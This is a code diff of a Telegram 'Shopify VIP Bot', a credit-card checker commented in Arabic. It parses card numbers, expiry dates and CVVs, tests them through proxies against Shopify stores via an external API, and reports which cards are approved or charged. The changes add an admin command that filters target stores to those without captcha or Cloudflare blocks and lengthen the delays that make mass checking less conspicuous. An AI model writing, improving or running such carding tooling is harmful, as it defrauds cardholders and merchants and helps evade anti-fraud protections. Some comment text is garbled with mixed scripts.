@@ -1,5 +1,5 @@
 # ==============================================================================
-# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨提𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘 SYSTEM (HIGH-SPEED CPM ENGINE)
+# 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗩𝗜𝗣 𝗕𝗢𝗧 - 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗥𝗢𝗗𝗨𝗖𝗧𝗜𝗢𝗡 𝗦𝗬𝗦𝗧𝗘 SYSTEM (HIGH-SPEED CPM ENGINE)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -84,7 +84,7 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# رابط الـ API الجديد الفريش والمطلوب حصرياً
+# رابط الـ API الجديد
 SHOPIFY_API_URL_1 = 'https://web-production-3d364.up.railway.app/shopify'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
@@ -371,7 +371,7 @@ def extract_cc(text):
         y = '20' + y if len(y) == 2 else y
         cards.append(f"{c}|{m}|{y}|{cv}")
     if not cards:
-        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|y|{cv}")
+        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
     if not cards:
         for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
     return list(dict.fromkeys(cards))
@@ -394,7 +394,17 @@ _LAST_SITES_FETCH = 0
 async def get_shopify_sites():
     global _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
     now = time.time()
-    if _CACHED_SHOPIFY_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SHOPIFY_SITES
+    if _CACHED_SHOPIFY_SITES: 
+        return _CACHED_SHOPIFY_SITES
+        
+    if os.path.exists('sites.txt'):
+        try:
+            async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
+                _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
+                if _CACHED_SHOPIFY_SITES:
+                    return _CACHED_SHOPIFY_SITES
+        except Exception: pass
+        
     try:
         async with aiohttp.ClientSession() as s:
             async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
@@ -402,11 +412,7 @@ async def get_shopify_sites():
                     _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
                     _LAST_SITES_FETCH = now
     except Exception: pass
-    if not _CACHED_SHOPIFY_SITES and os.path.exists('sites.txt'):
-        try:
-            async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
-                _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
-        except Exception: pass
+    
     return _CACHED_SHOPIFY_SITES
 
 def is_dead_site_error(err):
@@ -549,7 +555,6 @@ async def get_bin_info(bin_code, session=None):
 
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-# دالة جلب رد الـ API بالترتيب الأصلي الموثوق وبدون استعجال ومعالجة ردود الأخطاء المسببة للـ Approved الخاطئ
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
@@ -575,7 +580,6 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             
             try: 
                 rj = json.loads(text_data)
-                # استخراج الرد مع إعطاء الأولوية القصوى لمفتاح response_msg للـ API الجديد
                 rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', '')))))))).strip()
                 pr = rj.get('Price', rj.get('amount', "$10.00")) 
                 gt = rj.get('Gateway', 'Shopify')
@@ -586,7 +590,7 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             
             rl = rm.lower()
             
-            # [تحديث حرج]: اقتناص أخطاء شوبفاي وبوابات الدفع ومنعها فوراً من الوصول لشرط الـ Approved (تمت إضافة أخطاء التوكن هنا)
+            # اقتناص أخطاء شوبفاي وبوابات الدفع ومنعها فوراً من الوصول لشرط الـ Approved
             if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
@@ -1047,56 +1051,94 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
+    # أمر حصري للآدمن: استخراج بوابات شوبفاي من الملفات المرفوعة وتجربتها للتأكد من عدم وجود كابتشا
     elif cmd == "checkgates":
-        if uid not in ADMIN_ID: return
-        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Fetching gates from GitHub...')}</b>", use_gif=True)
+        if uid not in ADMIN_ID:
+            await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n╰ {sf('This command is restricted to administrators only.')}", use_gif=True)
+            return
+            
+        tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Fetching and filtering gates...')}</b>", use_gif=True)
         try:
-            async with aiohttp.ClientSession() as s:
-                async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
-                    if r.status == 200:
-                        raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
-                    else:
-                        return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Failed to fetch file from GitHub.')}</b>")
+            raw_sites = []
+            if update.message.reply_to_message and update.message.reply_to_message.document:
+                f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
+                fp = f"temp_gates_{uid}.txt"
+                await f.download_to_drive(fp)
+                async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file:
+                    content = await file.read()
+                os.remove(fp)
+                raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
+            else:
+                async with aiohttp.ClientSession() as s:
+                    async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
+                        if r.status == 200:
+                            content = await r.text()
+                            raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
+                        else:
+                            return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Failed to fetch file from GitHub.')}</b>")
+            
+            # تصفية وتجهيز المواقع الصحيحة فقط (Shopify)
+            valid_format_sites = []
+            for site in raw_sites:
+                site = site.lower().strip()
+                if not site or "." not in site: continue
+                site = site.split('/')[0].split('?')[0]
+                if "myshopify.com" in site:
+                    valid_format_sites.append(site)
+                elif len(site) > 4:
+                    valid_format_sites.append(site)
+                    
+            raw_sites = list(set(valid_format_sites))
             
             if not raw_sites:
-                return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('The GitHub sites file is empty.')}</b>")
+                return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('No valid sites found to test.')}</b>")
                 
             admin_proxies = await get_all_user_proxies(uid)
             proxies_list = list(admin_proxies) if admin_proxies else []
             
-            await styled_edit(tm, f"<b>{CE_HOURGLASS} {sf('Testing')} <code>{len(raw_sites)}</code> {sf('gates via active proxies...')}</b>")
+            await styled_edit(tm, f"<b>{CE_HOURGLASS} {sf('Testing')} <code>{len(raw_sites)}</code> {sf('gates for Captcha & Errors...')}</b>")
             
             working_sites = []
             dead_count = 0
+            captcha_count = 0
             
             async def _validate_gate(site_url, session):
-                nonlocal dead_count
+                nonlocal dead_count, captcha_count
                 p_url = random.choice(proxies_list)['proxy_url'] if proxies_list else None
-                target_url = f"https://{site_url}" if not site_url.startswith("http") else site_url
+                target_url = f"https://{site_url}/cart.json"
                 try:
-                    async with session.get(target_url, proxy=p_url, timeout=5, ssl=False) as resp:
-                        if resp.status in [200, 301, 302, 403]:
+                    async with session.get(target_url, proxy=p_url, timeout=6, ssl=False) as resp:
+                        # استبعاد بوابات الكابتشا أو החظر (403 = CF, 430 = Shopify Captcha, 429 = Rate Limit)
+                        if resp.status in [403, 429, 430, 502, 503, 504]:
+                            captcha_count += 1
+                            return
+                        if resp.status in [200, 301, 302, 404]:
                             working_sites.append(site_url)
                             return
                 except Exception:
                     pass
                 dead_count += 1
 
-            connector = aiohttp.TCPConnector(limit=50, ssl=False)
+            connector = aiohttp.TCPConnector(limit=60, ssl=False)
             async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=8)) as test_session:
                 tasks = [_validate_gate(site, test_session) for site in raw_sites]
                 await asyncio.gather(*tasks)
             
+            if working_sites:
+                async with aiofiles.open('sites.txt', 'w', encoding='utf-8') as f:
+                    await f.write('\n'.join(working_sites))
+            
+            global _CACHED_SHOPIFY_SITES
             _CACHED_SHOPIFY_SITES = working_sites
-            _LAST_SITES_FETCH = time.time()
             
             res_msg = f"""<b>{CE_CROWN} {sf('Gates Purge Completed')} {CE_PARTY}</b>
             
 ├ <b>{sf('Total Loaded')}:</b> <code>{sf(str(len(raw_sites)))}</code>
-├ <b>{CE_CHECK} {sf('Active Working')}:</b> <code>{sf(str(len(working_sites)))}</code>
+├ <b>{CE_CHECK} {sf('Active & Clean')}:</b> <code>{sf(str(len(working_sites)))}</code>
+├ <b>{CE_SHIELD} {sf('Captcha/CF Blocked')}:</b> <code>{sf(str(captcha_count))}</code>
 ╰ <b>{CE_CLOWN} {sf('Purged Dead')}:</b> <code>{sf(str(dead_count))}</code>
 
-<i>{sf('In-memory cache synchronized successfully!')}</i>"""
+<i>{sf('Sites saved and applied permanently!')}</i>"""
             await styled_edit(tm, res_msg)
             
         except Exception as e:
@@ -1249,7 +1291,6 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     sem = asyncio.Semaphore(WORKERS)
 
     async def worker(wid):
-        # توزيع خروج الخيوط بفواصل زمنية مدروسة تمنع القفزات المفاجئة
         await asyncio.sleep(wid * 0.4)
         nonlocal chk, chg, app, ins, dec, err, last_resp
         while not queue.empty() and not is_stopped():
@@ -1277,7 +1318,6 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 except Exception: err += 1; chk += 1
                 finally:
                     queue.task_done()
-                    # زيادة استراحة الخيط الفردي لإجبار التناوب العضوي كارت وراء كارت
                     if not is_stopped(): await asyncio.sleep(random.uniform(8.0, 14.0))
 
     wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
